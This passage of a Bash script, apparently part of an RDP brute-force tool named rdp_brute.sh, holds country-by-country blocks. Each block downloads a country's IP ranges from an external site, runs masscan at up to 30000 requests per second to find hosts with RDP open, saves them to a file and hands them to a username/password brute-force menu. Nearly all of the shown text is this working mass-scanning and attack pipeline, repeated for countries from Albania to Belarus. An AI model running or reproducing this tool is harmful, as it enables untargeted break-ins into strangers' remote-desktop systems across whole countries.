echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else

clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""
if [ "$country"  = "2" ]; then
curl http://ipdiapazon.16mb.com/Albania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""
echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "3" ]; then
curl http://ipdiapazon.16mb.com/Algeria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN




echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"



echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "4" ]; then
curl http://ipdiapazon.16mb.com/American_samoa.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "5" ]; then
curl http://ipdiapazon.16mb.com/Andorra.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else

clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "6" ]; then
curl http://ipdiapazon.16mb.com/Angola.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "7" ]; then
curl http://ipdiapazon.16mb.com/Anguilla.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "8" ]; then
curl http://ipdiapazon.16mb.com/Antigua.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "9" ]; then
curl http://ipdiapazon.16mb.com/Argentina.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "10" ]; then
curl http://ipdiapazon.16mb.com/Armenia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "11" ]; then
curl http://ipdiapazon.16mb.com/Aruba.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "12" ]; then
curl http://ipdiapazon.16mb.com/Australia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "13" ]; then
curl http://ipdiapazon.16mb.com/Austria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "14" ]; then
curl http://ipdiapazon.16mb.com/Azerbaijan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "15" ]; then
curl http://ipdiapazon.16mb.com/Bahamas.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "16" ]; then
curl http://ipdiapazon.16mb.com/Bahrain.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "17" ]; then
curl http://ipdiapazon.16mb.com/Bangladesh.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "18" ]; then
curl http://ipdiapazon.16mb.com/Barbados.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "19" ]; then
curl http://ipdiapazon.16mb.com/Belarus.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



